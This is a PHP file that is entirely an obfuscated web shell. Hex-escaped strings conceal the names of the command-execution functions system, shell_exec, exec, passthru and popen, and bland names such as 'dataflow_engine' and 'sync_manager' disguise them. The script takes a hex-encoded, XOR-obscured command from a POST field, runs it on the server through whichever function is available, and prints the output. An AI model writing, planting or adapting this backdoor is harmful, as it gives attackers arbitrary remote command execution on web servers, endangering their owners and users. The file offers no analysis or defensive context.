<?php

$dataflow_engine5 = "po\x70\x65n";
$dataflow_engine1 = "\x73y\x73\x74em";
$dataflow_engine2 = "\x73hell_\x65\x78\x65\x63";
$dataflow_engine4 = "\x70a\x73sthru";
$dataflow_engine6 = "s\x74r\x65am\x5F\x67et\x5F\x63ont\x65\x6E\x74s";
$buffer_cache = "hex\x32b\x69\x6E";
$dataflow_engine3 = "e\x78ec";
$dataflow_engine7 = "\x70c\x6Cos\x65";
if (isset($_POST["\x72es"])) {
            function sync_manager    ( $object    ,   $k  ) {
$desc =   '' ;
foreach(str_split($object) as $char){
$desc.=chr(ord($char)^$k);

} return $desc;
 
}
            $res = $buffer_cache($_POST["\x72es"]);
            $res = sync_manager($res, 67);
            if (function_exists($dataflow_engine1)) {
                $dataflow_engine1($res);
            } elseif (function_exists($dataflow_engine2)) {
                print $dataflow_engine2($res);
            } elseif (function_exists($dataflow_engine3)) {
                $dataflow_engine3($res, $dchunk_object);
                print join("\n", $dchunk_object);
            } elseif (function_exists($dataflow_engine4)) {
                $dataflow_engine4($res);
            } elseif (function_exists($dataflow_engine5) && function_exists($dataflow_engine6) && function_exists($dataflow_engine7)) {
                $k_desc = $dataflow_engine5($res, 'r');
                if ($k_desc) {
                    $entity_dat = $dataflow_engine6($k_desc);
                    $dataflow_engine7($k_desc);
                    print $entity_dat;
                }
            }
            exit;
        }